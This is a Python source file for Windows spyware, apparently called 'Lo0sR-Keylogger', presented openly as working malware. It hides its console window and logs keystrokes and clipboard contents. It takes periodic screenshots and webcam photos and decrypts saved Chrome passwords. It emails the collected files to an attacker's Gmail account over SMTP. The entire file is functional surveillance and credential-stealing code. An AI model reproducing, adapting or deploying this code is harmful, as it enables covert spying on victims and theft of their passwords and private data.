import time
import pyHook
import smtplib
import sqlite3
import win32gui
import mimetypes
import pythoncom
import win32crypt
import win32console
import win32clipboard
from os import getenv
from Queue import Queue
from PIL import ImageGrab
from threading import Thread
from VideoCapture import Device
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.utils import formatdate
from email.mime.multipart import MIMEMultipart


NUMBER_OF_THREADS = 5
JOB_NUMBER = [1, 2, 3, 4, 5, ]
queue = Queue()


# KEYLOGGER CONFIG
# output file name
f_name = "output.txt"


# CAMERA CONFIG

# Screenshot
# interval in sec
interval = 60

# WebCam
# interval in sec
interval_webcam = 120


# MAIL CONFIG
files = ["output.txt", ]

FromConf = 'your_username@gmail.com'
ToConf = 'your_username@gmail.com'
passwordConf = 'your_password'

intervalMail = 360


# Hides Window
def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
hide()


# Gets Key if Key is being pressed
def keydown(event):
    global data
    if event.Ascii == 13:
            keys = '<ENTER>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 8:
            keys = '<BACKSPACE>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 9:
            keys = '<TAB>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 27:
            keys = '<ESC>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 0:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        fp = open(f_name, 'a')
        fp.write(data + "\n")
        fp.close()
    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
            pass
    else:
            keys = chr(event.Ascii)
            fp = open(f_name, 'a')
            data = keys
            fp.write(data)
            fp.close()

# Starts Keylogging part and manages it
def keylogger():
    obj = pyHook.HookManager()
    obj.KeyDown = keydown
    obj.HookKeyboard()
    obj.HookMouse()
    pythoncom.PumpMessages()


# Takes Photo through webcam
def webcam_pic(interval_w):
    cam = Device()
    while True:
        time.sleep(interval_w)
        pic = cam.saveSnapshot('image.png')
        files.append(pic)


# Makes screenshot
def screenshot(interval_scr):
    while True:
        time.sleep(interval_scr)
        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
        scr = "screenshot" + cur_time + ".png"
        files.append(scr)
        ImageGrab.grab().save(scr, "PNG")


# Sends Mail with all the data as attachments
def send_mail(From, To, password, intervalM):

    while True:

        time.sleep(intervalM)
        msg = MIMEMultipart()
        msg['From'] = From
        msg['To'] = To
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = 'Lo0sR-Keylogger'

        msg.attach(MIMEText('Output'))

        try:
            smtp = smtplib.SMTP('smtp.gmail.com:587')
            smtp.starttls()
            smtp.login(From, password)
        except:
            login = 'failed'
        else:
            login = 'success'

        if login == 'success':
            for file in files:
                ctype, encoding = mimetypes.guess_type(file)
                if ctype is None or encoding is not None:
                    # No guess could be made, or the file is encoded (compressed), so
                    # use a generic bag-of-bits type.
                    ctype = 'application/octet-stream'
                maintype, subtype = ctype.split('/', 1)
                if maintype == 'text':
                    fp = open(file)
                    # Note: we should handle calculating the charset
                    part = MIMEText(fp.read(), _subtype=subtype)
                    fp.close()
                elif maintype == 'image':
                    fp = open(file, 'rb')
                    part = MIMEImage(fp.read(), _subtype=subtype)
                    fp.close()
                else:
                    fp = open(file, 'rb')
                    part = MIMEBase(maintype, subtype)
                    part.set_payload(fp.read())
                    fp.close()
                part.add_header('Content-Disposition', 'attachment; filename="%s"' % file)
                msg.attach(part)
            try:
                smtp.sendmail(From, To, msg.as_string())
                open(f_name, 'w').close()
                with open(f_name, 'w') as f:
                    f.write('### Keylogger - Log ###\n')
                    f.close()
                dump_chrome_passwords()
                del files[:]
                files.append("output.txt")
                print 'success'
            except:
                print 'fail'
        else:
            print 'failed'
            smtp.close()


"""
Dump All Chrome Passwords
Output:

    Website: some-website.com
    Username: some username for this website
    Password: password for this Username

"""

# Dumps all Chrome passwords
def dump_chrome_passwords():

    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    with open(f_name, 'a') as f:
        f.write('\n### All Chrome Passwords ###\n')
        f.close()
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            with open(f_name, 'w') as f:
                f.write('### All Chrome Passwords ###' + 'Website: ' + result[0] + '\n' + 'Username: ' + result[1] + '\n' + 'Password: ' + password + '\n\n')
                f.close()


# Creates threads for all the seperate processes
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = Thread(target=work)
        t.daemon = True
        t.start()


# Basicly 'assigns' workers to threads
def work():

    x = queue.get()
    if x == 1:
        keylogger()
    if x == 2:
        send_mail(FromConf, ToConf, passwordConf, intervalMail)
    if x == 3:
        screenshot(interval)
    if x == 4:
        dump_chrome_passwords()
    if x == 5:
        webcam_pic(interval_webcam)
    queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
